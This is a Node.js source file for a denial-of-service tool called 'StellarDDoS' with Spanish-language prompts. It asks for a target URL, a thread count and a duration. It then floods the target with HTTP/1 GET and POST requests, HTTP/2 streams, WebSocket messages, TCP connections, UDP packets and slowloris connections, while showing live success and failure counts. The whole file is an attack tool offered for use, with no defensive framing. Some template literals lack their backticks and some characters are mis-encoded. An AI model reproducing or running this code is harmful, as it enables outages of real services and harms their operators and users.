#!/usr/bin/env node 'use strict';

const net = require('net'); const dgram = require('dgram'); const http = require('http'); const https = require('https'); const http2 = require('http2'); const WebSocket = require('ws'); const { performance } = require('perf_hooks'); const readline = require('readline'); const chalk = require('chalk');

class StellarDDoS { constructor() { this.stats = { total: 0, success: 0, failed: 0, startTime: 0 }; this.running = false; this.anim = ['|', '/', '-', '.']; this.animIdx = 0; }

startAttack(target, options = {}) { if (this.running) { console.log(chalk.red('Ataque ya en ejecuciÃ³n')); return; } const threads = options.threads || 200; const duration = options.duration || 30; const url = new URL(target); const protocol = target.startsWith('https') ? https : http;

this.running = true;
this.stats.startTime = performance.now();
this.agent = new protocol.Agent({ keepAlive: true, maxSockets: threads * 1000 });
this.udpSocket = dgram.createSocket('udp4').on('error', () => {});
this.displayInterval = setInterval(() => this.displayStats(), 100);

for (let i = 0; i < threads * 200; i++) setImmediate(() => this.floodHTTP1(url, protocol));
for (let i = 0; i < threads * 100; i++) setImmediate(() => this.floodHTTP2(url));
for (let i = 0; i < threads * 200; i++) setImmediate(() => this.floodWebSocket(url));
for (let i = 0; i < threads * 200; i++) setImmediate(() => this.tcpFlood(url));
for (let i = 0; i < threads * 100; i++) setImmediate(() => this.udpFlood(url));
for (let i = 0; i < threads * 50; i++) setImmediate(() => this.slowloris(url, protocol));
for (let i = 0; i < threads * 100; i++) setImmediate(() => this.floodHTTPPost(url, protocol));

setTimeout(() => this.stop(), duration * 1000);

}

floodHTTP1(url, protocol) { if (!this.running) return; const req = protocol.request({ hostname: url.hostname, port: url.port || (url.protocol === 'https:' ? 443 : 80), path: url.pathname + '?' + Math.random().toString(36).slice(2), method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0', Connection: 'keep-alive' }, agent: this.agent }, res => { res.on('data', () => {}); res.on('end', () => { this.onSuccess(); setImmediate(() => this.floodHTTP1(url, protocol)); }); }); req.on('error', () => { this.onFail(); setImmediate(() => this.floodHTTP1(url, protocol)); }); req.setTimeout(500, () => req.destroy()); req.end(); }

floodHTTP2(url) { if (!this.running) return; const client = http2.connect(url.origin); client.on('error', () => client.close()); for (let i = 0; i < 10; i++) { const req = client.request({ ':path': url.pathname + '?' + Math.random().toString(36).slice(2), ':method': 'GET' }); req.on('data', () => {}); req.on('end', () => { this.onSuccess(); setImmediate(() => this.floodHTTP2(url)); req.close(); }); req.end(); } setTimeout(() => client.close(), 1000); }

floodHTTPPost(url, protocol) { if (!this.running) return; const req = protocol.request({ hostname: url.hostname, port: url.port || (url.protocol === 'https:' ? 443 : 80), path: url.pathname + '?' + Math.random().toString(36).slice(2), method: 'POST', headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded', Connection: 'keep-alive' }, agent: this.agent }, res => { res.on('data', () => {}); res.on('end', () => { this.onSuccess(); setImmediate(() => this.floodHTTPPost(url, protocol)); }); }); req.on('error', () => { this.onFail(); setImmediate(() => this.floodHTTPPost(url, protocol)); }); req.write(data=${Math.random().toString(36).slice(2)}); req.end(); }

floodWebSocket(url) { if (!this.running) return; const ws = new WebSocket(url.origin.replace(/^http/, 'ws')); ws.on('open', () => { const msg = 'X'.repeat(1024); ws.send(msg, err => err ? this.onFail() : this.onSuccess()); setImmediate(() => this.floodWebSocket(url)); }); ws.on('error', () => { this.onFail(); setImmediate(() => this.floodWebSocket(url)); }); }

tcpFlood(url) { if (!this.running) return; const sock = net.connect({ host: url.hostname, port: url.port || 80 }, () => { this.onSuccess(); sock.destroy(); setImmediate(() => this.tcpFlood(url)); }); sock.on('error', () => { this.onFail(); setImmediate(() => this.tcpFlood(url)); }); }

udpFlood(url) { if (!this.running) return; const msg = Buffer.alloc(2048); this.udpSocket.send(msg, url.port || 80, url.hostname, err => { err ? this.onFail() : this.onSuccess(); setImmediate(() => this.udpFlood(url)); }); }

slowloris(url) { if (!this.running) return; const sock = net.connect(url.port || (url.protocol === 'https:' ? 443 : 80), url.hostname, () => { sock.write(POST ${url.pathname} HTTP/1.1\r\nHost: ${url.hostname}\r\n); sock.write('User-Agent: Mozilla/5.0\r\n'); const iv = setInterval(() => { if (!this.running) { clearInterval(iv); sock.destroy(); return; } sock.write(X-a: ${Math.random()}\r\n); }, 1000); }); sock.on('error', () => this.onFail()); }

onSuccess() { this.stats.success++; this.stats.total++; process.stdout.write(chalk.green('.')); } onFail() { this.stats.failed++; this.stats.total++; process.stdout.write(chalk.red('x')); }

displayStats() { const elapsed = ((performance.now() - this.stats.startTime) / 1000).toFixed(2); this.animIdx = (this.animIdx + 1) % this.anim.length; process.stdout.write(\x1b[2K${chalk.greenBright(this.anim[this.animIdx])} ${elapsed}s | Total:${this.stats.total} | + ${chalk.green(this.stats.success)} | ${chalk.red(this.stats.failed)}); }

stop() { if (!this.running) return; clearInterval(this.displayInterval); this.udpSocket.close(); const elapsed = ((performance.now() - this.stats.startTime) / 1000).toFixed(2); console.log(chalk.green( Ataque finalizado en ${elapsed}s)); console.log(chalk.blue(Total de peticiones: ${this.stats.total})); console.log(chalk.green(Ã‰xitos: ${this.stats.success}) + ' | ' + chalk.red(Fallidos: ${this.stats.failed})); process.exit(0); } }

const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); const stellar = new StellarDDoS(); rl.question(chalk.greenBright('URL objetivo: '), target => { rl.question(chalk.greenBright('NÃºmero de hilos (200): '), threads => { rl.question(chalk.greenBright('DuraciÃ³n (30s): '), duration => { stellar.startAttack(target, { threads: parseInt(threads) || 200, duration: parseInt(duration) || 30 }); rl.on('line', line => { if (line.trim() === 'stop') { stellar.stop(); rl.close(); } }); }); }); }); rl.on('close', () => stellar.stop());

